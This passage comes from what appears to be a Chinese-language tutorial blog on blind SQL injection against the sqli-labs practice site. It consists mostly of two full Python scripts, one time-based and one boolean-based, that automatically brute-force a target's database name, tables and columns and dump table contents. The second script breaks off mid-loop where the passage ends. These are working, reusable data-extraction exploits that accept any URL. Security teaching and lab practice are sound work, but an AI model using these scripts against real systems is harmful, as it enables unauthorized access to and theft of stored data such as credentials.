class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">author : L0ne1y</span><br><span class="line">time : 2021-08-29</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def close(url):</span><br><span class="line">    s = input(&quot;请输入闭合方式:&quot;)</span><br><span class="line">    url = url + s</span><br><span class="line">    return url</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def db_ascii_list():</span><br><span class="line">    ascii_list = []</span><br><span class="line">    for i in range(33, 127):</span><br><span class="line">        ascii_list.append(chr(i))</span><br><span class="line">    return ascii_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 爆破数据库名</span><br><span class="line">def db_name(url, str, ascii_list):</span><br><span class="line">    print(&quot;[-]开始爆破数据库名.......&quot;)</span><br><span class="line">    num = 1</span><br><span class="line">    while True:</span><br><span class="line">        db_payload = url + &quot; and if(length(database())=%d,sleep(2),1) --+&quot; % num</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        # print(db_payload)</span><br><span class="line">        r = requests.get(db_payload)</span><br><span class="line">        if time.time() - start_time &gt; 2:</span><br><span class="line">            db_length = num</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            num += 1</span><br><span class="line">    # print(db_length)</span><br><span class="line">    db_name = &#x27;&#x27;</span><br><span class="line">    for i in range(1, db_length + 1):</span><br><span class="line">        max = 127</span><br><span class="line">        min = 33</span><br><span class="line">        while abs(max - min) &gt; 1:</span><br><span class="line">            midx = int((max + min) / 2)</span><br><span class="line">            db_name_payload = url + &quot; and if(ord(mid((database()),%d,1))&gt;%d,sleep(2),1) --+&quot; % (i, midx)</span><br><span class="line">            # print(db_name_payload)</span><br><span class="line">            start_time = time.time()</span><br><span class="line">            r = requests.get(db_name_payload)</span><br><span class="line">            if time.time() - start_time &gt; 2:</span><br><span class="line">                min = midx</span><br><span class="line">            else:</span><br><span class="line">                max = midx</span><br><span class="line">        db_name += chr(max)</span><br><span class="line">    print(&quot;[+]数据库名：%s\n&quot; % db_name)</span><br><span class="line">    return db_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 爆破表名</span><br><span class="line">def tb_name(url, str, ascii_list, db_name):</span><br><span class="line">    print(&quot;[-]开始爆破表名&quot;)</span><br><span class="line">    i = 1</span><br><span class="line">    while True:</span><br><span class="line">        tb_payload = url + &quot; and if((select count(table_name) from information_schema.tables where table_schema=&#x27;%s&#x27;)=%d,sleep(2),1) --+&quot; % (</span><br><span class="line">            db_name, i)</span><br><span class="line">        # print(tb_payload)</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        r = requests.get(tb_payload)</span><br><span class="line">        if time.time() - start_time &gt; 2:</span><br><span class="line">            tb_number = i</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            i += 1</span><br><span class="line">    j = 1</span><br><span class="line">    tb_name_length = []</span><br><span class="line">    for i in range(tb_number):</span><br><span class="line">        while True:</span><br><span class="line">            tb_name_length_payload = url + &quot; and if((select length(table_name) from information_schema.tables where table_schema=&#x27;%s&#x27; limit %d,1)=%d,sleep(2),1) --+&quot; % (</span><br><span class="line">                db_name, i, j)</span><br><span class="line">            # print(tb_name_length_payload)</span><br><span class="line">            start_time = time.time()</span><br><span class="line">            r = requests.get(tb_name_length_payload)</span><br><span class="line">            if time.time() - start_time &gt; 2:</span><br><span class="line">                tb_name_length.append(j)</span><br><span class="line">                j = 1</span><br><span class="line">                break</span><br><span class="line">            else:</span><br><span class="line">                j += 1</span><br><span class="line"></span><br><span class="line">    tb_name_list = []</span><br><span class="line">    for i in range(tb_number):</span><br><span class="line">        tb_name = &#x27;&#x27;</span><br><span class="line">        for j in range(1, tb_name_length[i] + 1):</span><br><span class="line">            max = 127</span><br><span class="line">            min = 33</span><br><span class="line">            while abs((max - min)) &gt; 1:</span><br><span class="line">                midx = int((max + min) / 2)</span><br><span class="line">                tb_name_payload = url + &quot; and if(ord(mid((select table_name from information_schema.tables where table_schema=&#x27;%s&#x27; limit %d,1),%d,1))&gt;%d,sleep(2),1) --+&quot; % (</span><br><span class="line">                    db_name, i, j, midx)</span><br><span class="line">                start_time = time.time()</span><br><span class="line">                r = requests.get(tb_name_payload)</span><br><span class="line">                # print(tb_name_payload)</span><br><span class="line">                if time.time() - start_time &gt; 2:</span><br><span class="line">                    min = midx</span><br><span class="line">                else:</span><br><span class="line">                    max = midx</span><br><span class="line">            tb_name += chr(max)</span><br><span class="line">        tb_name_list.append(tb_name)</span><br><span class="line">    print(&quot;\n[+]%s库下的%d张表为：%s\n&quot; % (db_name, tb_number, tb_name_list))</span><br><span class="line">    return tb_name_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def column_name(url, str, ascii_list, tb_name_list, db_name):</span><br><span class="line">    while True:</span><br><span class="line">        tb_name = input(&quot;请输入你选择的表名(例如 admin):&quot;)</span><br><span class="line">        if tb_name in tb_name_list:</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;输入的表名有误,请重新输入&quot;)</span><br><span class="line"></span><br><span class="line">    j = 1</span><br><span class="line">    while True:</span><br><span class="line">        column_num_payload = url + &quot; and if((select count(column_name) from information_schema.columns where table_name=&#x27;%s&#x27; and table_schema=&#x27;%s&#x27;)=%d,sleep(2),1) --+&quot; % (</span><br><span class="line">            tb_name, db_name, j)</span><br><span class="line">        # print(column_num_payload)</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        r = requests.get(column_num_payload)</span><br><span class="line">        if time.time() - start_time &gt; 2:</span><br><span class="line">            column_num = j</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            j += 1</span><br><span class="line"></span><br><span class="line">    column_name_length = []</span><br><span class="line">    k = 1</span><br><span class="line">    for j in range(column_num):</span><br><span class="line">        while True:</span><br><span class="line">            column_name_length_payload = url + &quot; and if((select length(column_name) from information_schema.columns where table_name=&#x27;%s&#x27; and table_schema=&#x27;%s&#x27; limit %d,1)=%d,sleep(2),1) --+&quot; % (</span><br><span class="line">                tb_name, db_name, j, k)</span><br><span class="line">            # print(column_name_length_payload)</span><br><span class="line">            start_time = time.time()</span><br><span class="line">            r = requests.get(column_name_length_payload)</span><br><span class="line">            if time.time() - start_time &gt; 2:</span><br><span class="line">                column_name_length.append(k)</span><br><span class="line">                k = 1</span><br><span class="line">                break</span><br><span class="line">            else:</span><br><span class="line">                k += 1</span><br><span class="line"></span><br><span class="line">    print(&quot;[-]开始爆破%s表的字段名:&quot; % tb_name)</span><br><span class="line">    column_name_list = []</span><br><span class="line">    for i in range(len(column_name_length)):</span><br><span class="line">        column_name = &#x27;&#x27;</span><br><span class="line">        for j in range(1, column_name_length[i] + 1):</span><br><span class="line">            max = 127</span><br><span class="line">            min = 33</span><br><span class="line">            while abs(max - min) &gt; 1:</span><br><span class="line">                midx = int((max + min) / 2)</span><br><span class="line">                column_name_payload = url + &quot; and if(ord(mid((select column_name from information_schema.columns where table_name=&#x27;%s&#x27; and table_schema=&#x27;%s&#x27; limit %d,1),%d,1))&gt;%d,sleep(2),1) --+&quot; % (</span><br><span class="line">                    tb_name, db_name, i, j, midx)</span><br><span class="line">                # print(column_name_payload)</span><br><span class="line">                start_time = time.time()</span><br><span class="line">                r = requests.get(column_name_payload)</span><br><span class="line">                if time.time() - start_time &gt; 2:</span><br><span class="line">                    min = midx</span><br><span class="line">                else:</span><br><span class="line">                    max = midx</span><br><span class="line">            column_name += chr(max)</span><br><span class="line">        column_name_list.append(column_name)</span><br><span class="line">    print(&quot;[+]%s表的字段名分别为:%s&quot; % (tb_name, column_name_list))</span><br><span class="line">    return column_name_list, tb_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def dump_data(url, str, tb_name, db_name, column_name_list):</span><br><span class="line">    i = 1</span><br><span class="line">    while True:</span><br><span class="line">        data_num_payload = url + &quot; and if((select count(*) from %s.%s)=%d,sleep(2),1) --+&quot; % (</span><br><span class="line">            db_name, tb_name, i)</span><br><span class="line">        # print(data_num_payload)</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        r = requests.get(data_num_payload)</span><br><span class="line">        if time.time() - start_time &gt; 2:</span><br><span class="line">            data_num = i</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            i += 1</span><br><span class="line">    print(&quot;[-]开始爆破%s数据库的%s表中数据:&quot; % (db_name, tb_name))</span><br><span class="line">    k = 1</span><br><span class="line">    data_length = []</span><br><span class="line">    dump_data_list = []</span><br><span class="line">    dump_data = &#x27;&#x27;</span><br><span class="line">    for i in column_name_list:</span><br><span class="line">        for j in range(data_num):</span><br><span class="line">            while True:</span><br><span class="line">                dump_data_length_payload = url + &quot; and if(ascii(substr((select %s from %s.%s limit %d,1),%d,1)),sleep(2),1) --+&quot; % (</span><br><span class="line">                    i, db_name, tb_name, j, k)</span><br><span class="line">                # print(dump_data_length_payload)</span><br><span class="line">                start_time = time.time()</span><br><span class="line">                r = requests.get(dump_data_length_payload)</span><br><span class="line">                if time.time() - start_time &lt; 2:</span><br><span class="line">                    dump_data_length = k - 1</span><br><span class="line">                    k = 1</span><br><span class="line">                    break</span><br><span class="line">                else:</span><br><span class="line">                    k += 1</span><br><span class="line">            data_length.append(dump_data_length)</span><br><span class="line">            for l in range(1, dump_data_length + 1):</span><br><span class="line">                max = 127</span><br><span class="line">                min = 33</span><br><span class="line">                while abs(max - min) &gt; 1:</span><br><span class="line">                    midx = int((max + min) / 2)</span><br><span class="line">                    dump_data_payload = url + &quot; and if(ord(mid((select %s from %s.%s limit %d,1),%d,1))&gt;%d,sleep(2),1) --+&quot; % (</span><br><span class="line">                        i, db_name, tb_name, j, l, midx)</span><br><span class="line">                    # print(dump_data_payload)</span><br><span class="line">                    start_time = time.time()</span><br><span class="line">                    r = requests.get(dump_data_payload)</span><br><span class="line">                    if time.time() - start_time &gt; 2:</span><br><span class="line">                        min = midx</span><br><span class="line">                    else:</span><br><span class="line">                        max = midx</span><br><span class="line">                dump_data += chr(max)</span><br><span class="line">                # print(dump_data)</span><br><span class="line">            dump_data_list.append(dump_data)</span><br><span class="line">            dump_data = &#x27;&#x27;</span><br><span class="line">            # print( dump_data_list)</span><br><span class="line">    print(&quot;[+]%s数据库的%s表的数据:&quot; % (db_name, tb_name))</span><br><span class="line">    j = 0</span><br><span class="line">    num_1 = len(dump_data_list) // data_num</span><br><span class="line">    for i in range(data_num):</span><br><span class="line">        j = i</span><br><span class="line">        for k in range(num_1):</span><br><span class="line">            print(&quot;%s\t\t&quot; % dump_data_list[j], end=&#x27;&#x27;)</span><br><span class="line">            j = i + data_num</span><br><span class="line">        print()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def re(url, str, ascii_list, tb_name_list, db_name):</span><br><span class="line">    while True:</span><br><span class="line">        tb_name = input(&quot;如需跑其他表,请输入任意字符,否则输入No(例如 admin):&quot;)</span><br><span class="line">        if tb_name == &#x27;NO&#x27; or tb_name == &#x27;No&#x27; or tb_name == &#x27;no&#x27;:</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            print(tb_name_list)</span><br><span class="line">            column_name_list, tb_name = column_name(url, str, ascii_list, tb_name_list, db_name)</span><br><span class="line">            dump_data(url, str, tb_name, db_name, column_name_list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = input(&quot;请输入URL:&quot;)  # 目标url http://127.0.0.1/sqli/Less-5/?id=1</span><br><span class="line">url = close(url)</span><br><span class="line">ascii_list = db_ascii_list()</span><br><span class="line">db_name = db_name(url, str, ascii_list)</span><br><span class="line">tb_name_list = tb_name(url, str, ascii_list, db_name)</span><br><span class="line">column_name_list, tb_name = column_name(url, str, ascii_list, tb_name_list, db_name)</span><br><span class="line">dump_data(url, str, tb_name, db_name, column_name_list)</span><br><span class="line">re(url, str, ascii_list, tb_name_list, db_name)</span><br></pre></td></tr></table></figure><h3 id="基于布尔的SQL盲注-逻辑判断"><a href="#基于布尔的SQL盲注-逻辑判断" class="headerlink" title="基于布尔的SQL盲注-逻辑判断"></a>基于布尔的SQL盲注-逻辑判断</h3><p>一般都用脚本跑</p><p>页面只返回True和False两种类型页面。利用页面返回不同，逐个猜解数据。也可以用时间盲注</p><p>查数据库名长度，需要一个一个试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length(database())=8 --+</span><br></pre></td></tr></table></figure><h4 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def close(url):</span><br><span class="line">    s = input(&quot;请输入闭合方式:&quot;)</span><br><span class="line">    url = url + s</span><br><span class="line">    return url</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def db_ascii_list():</span><br><span class="line">    ascii_list = []</span><br><span class="line">    for i in range(33, 127):</span><br><span class="line">        ascii_list.append(chr(i))</span><br><span class="line">    return ascii_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 爆破数据库名</span><br><span class="line">def db_name(url, str, ascii_list):</span><br><span class="line">    print(&quot;[-]开始爆破数据库名.......&quot;)</span><br><span class="line">    num = 1</span><br><span class="line">    while True:</span><br><span class="line">        db_payload = url + &quot; and length(database())=%d --+&quot; % num</span><br><span class="line">        r = requests.get(db_payload)</span><br><span class="line">        if str in r.text:</span><br><span class="line">            db_length = num</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            num += 1</span><br><span class="line">    db_name = &#x27;&#x27;</span><br><span class="line">    for i in range(1, db_length + 1):</span><br><span class="line">        for j in ascii_list:</span><br><span class="line">            db_name_payload = url + &quot; and ord(mid((database()),%d,1))=%d --+&quot; % (i, ord(j))</span><br><span class="line">            # print(db_name_payload)</span><br><span class="line">            r = requests.get(db_name_payload)</span><br><span class="line">            if str in r.text:</span><br><span class="line">                db_name += j</span><br><span class="line">                break</span><br><span class="line">            else:</span><br><span class="line">                pass</span><br><span class="line">    print(&quot;[+]数据库名：%s\n&quot; % db_name)</span><br><span class="line">    return db_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 爆破表名</span><br><span class="line">def tb_name(url, str, ascii_list, db_name):</span><br><span class="line">    print(&quot;[-]开始爆破表名&quot;)</span><br><span class="line">    i = 1</span><br><span class="line">    while True:</span><br><span class="line">        tb_payload = url + &quot; and (select count(table_name) from information_schema.tables where table_schema=&#x27;%s&#x27;)=%d --+&quot; % (</span><br><span class="line">            db_name, i)</span><br><span class="line">        # print(tb_payload)</span><br><span class="line">        r = requests.get(tb_payload)</span><br><span class="line">        if str in r.text:</span><br><span class="line">            tb_number = i</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            i += 1</span><br><span class="line">    j = 1</span><br><span class="line">    tb_name_length = []</span><br><span class="line">    for i in range(tb_number):</span><br><span class="line">        while True:</span><br><span class="line">            tb_name_length_payload = url + &quot; and (select length(table_name) from information_schema.tables where table_schema=&#x27;%s&#x27; limit %d,1)=%d --+&quot; % (</span><br><span class="line">                db_name, i, j)</span><br><span class="line">            # print(tb_name_length_payload)</span><br><span class="line">            r = requests.get(tb_name_length_payload)</span><br><span class="line">            if str in r.text:</span><br><span class="line">                tb_name_length.append(j)</span><br><span class="line">                j = 1</span><br><span class="line">                break</span><br><span class="line">            else:</span><br><span class="line">                j += 1</span><br><span class="line"></span><br><span class="line">    tb_name_list = []</span><br><span class="line">    for i in range(tb_number):</span><br><span class="line">        tb_name = &#x27;&#x27;</span><br><span class="line">        for j in range(1, tb_name_length[i] + 1):</span><br><span class="line">            for k in ascii_list:</span><br><span class="line">                tb_name_payload = url + &quot; and ord(mid((select table_name from information_schema.tables where table_schema=&#x27;%s&#x27; limit %d,1),%d,1))=%d --+&quot; % (</span><br><span class="line">                    db_name, i, j, ord(k))</span><br><span class="line">                r = requests.get(tb_name_payload)</span><br><span class="line">                # print(tb_name_payload)</span><br><span class="line">                if str in r.text:</span><br><span class="line">                    tb_name += k</span><br><span class="line">                    break</span><br><span class="line">                else:</span><br><span class="line">                    pass</span><br><span class="line">        tb_name_list.append(tb_name)</span><br><span class="line">    print(&quot;\n[+]%s库下的%d张表为：%s\n&quot; % (db_name, tb_number, tb_name_list))</span><br><span class="line">    return tb_name_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def column_name(url, str, ascii_list, tb_name_list, db_name):</span><br><span class="line">    while True:</span><br><span class="line">        tb_name = input(&quot;请输入你选择的表名(例如 admin):&quot;)</span><br><span class="line">        if tb_name in tb_name_list:</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;输入的表名有误,请重新输入&quot;)</span><br><span class="line"></span><br><span class="line">    j = 1</span><br><span class="line">    while True:</span><br><span class="line">        column_num_payload = url + &quot; and (select count(column_name) from information_schema.columns where table_name=&#x27;%s&#x27; and table_schema=&#x27;%s&#x27;)=%d --+&quot; % (</span><br><span class="line">            tb_name, db_name, j)</span><br><span class="line">        # print(column_num_payload)</span><br><span class="line">        r = requests.get(column_num_payload)</span><br><span class="line">        if str in r.text:</span><br><span class="line">            column_num = j</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            j += 1</span><br><span class="line"></span><br><span class="line">    column_name_length = []</span><br><span class="line">    k = 1</span><br><span class="line">    for i in range(column_num):</span><br><span class="line">        while True:</span><br><span class="line">            column_name_length_payload = url + &quot; and (select length(column_name) from information_schema.columns where table_name=&#x27;%s&#x27; limit %d,1)=%d --+&quot; % (</span><br><span class="line">                tb_name, i, k)</span><br><span class="line">            # print(column_name_length_payload)</span><br><span class="line">            r = requests.get(column_name_length_payload)</span><br><span class="line">            if str in r.text:</span><br><span class="line">                column_name_length.append(k)</span><br><span class="line">                k = 1</span><br><span class="line">                break</span><br><span class="line">            else:</span><br><span class="line">                k += 1</span><br><span class="line"></span><br><span class="line">    print(&quot;[-]开始爆破%s表的字段名:&quot; % tb_name)</span><br><span class="line">    column_name_list = []</span><br><span class="line">    for i in range(len(column_name_length)):</span><br><span class="line">        column_name = &#x27;&#x27;</span><br><span class="line">        for j in range(1, column_name_length[i] + 1):</span><br><span class="line">            for k in ascii_list:</span><br><span class="line">                column_name_payload = url + &quot; and ord(mid((select column_name from information_schema.columns where table_name=&#x27;%s&#x27; limit %d,1),%d,1))=%d --+&quot; % (</span><br><span class="line">                    tb_name, i, j, ord(k))</span><br><span class="line">                # print(column_name_payload)</span><br><span class="line">                r = requests.get(column_name_payload)</span><br><span class="line">                if str in r.text:</span><br><span class="line">                    column_name += k</span><br><span class="line">                    break</span><br><span class="line">                else:</span><br><span class="line">                    pass</span><br><span class="line">        column_name_list.append(column_name)</span><br><span class="line">    print(&quot;[+]%s表的字段名分别为:%s&quot; % (tb_name, column_name_list))</span><br><span class="line">    return column_name_list, tb_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def dump_data(url, str, tb_name, db_name, column_name_list):</span><br><span class="line">    i = 1</span><br><span class="line">    while True:</span><br><span class="line">        data_num_payload = url + &quot; and (select count(*) from %s.%s)=%d --+&quot; % (db_name, tb_name, i)</span><br><span class="line">        # print(data_num_payload)</span><br><span class="line">        r = requests.get(data_num_payload)</span><br><span class="line">        if str in r.text:</span><br><span class="line">            data_num = i</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            i += 1</span><br><span class="line">    print(&quot;[-]开始爆破%s数据库的%s表中数据:&quot; % (db_name, tb_name))</span><br><span class="line">    k = 1</span><br><span class="line">    data_length = []</span><br><span class="line">    dump_data_list = []</span><br><span class="line">    dump_data = &#x27;&#x27;</span><br><span class="line">    for i in column_name_list:</span><br><span class="line">        for j in range(data_num):</span><br><span class="line">            while True:</span><br><span class="line">                dump_data_length_payload = url + &quot; and ascii(substr((select %s from %s.%s limit %d,1),%d,1)) --+&quot; % (</span><br><span class="line">                    i, db_name, tb_name, j, k)</span><br><span class="line">                # print(dump_data_length_payload)</span><br><span class="line">                r = requests.get(dump_data_length_payload)</span><br><span class="line">                if str not in r.text:</span><br><span class="line">                    dump_data_length = k - 1</span><br><span class="line">                    k = 1</span><br><span class="line">                    break</span><br><span class="line">                else:</span><br><span class="line">                    k += 1</span><br><span class="line">            data_length.append(dump_data_length)</span><br><span class="line">            for l in range(1, dump_data_length + 1):</span><br><span class="line">                max = 127</span><br><span class="line">                min = 33</span><br><span class="line">                while abs(max - min) 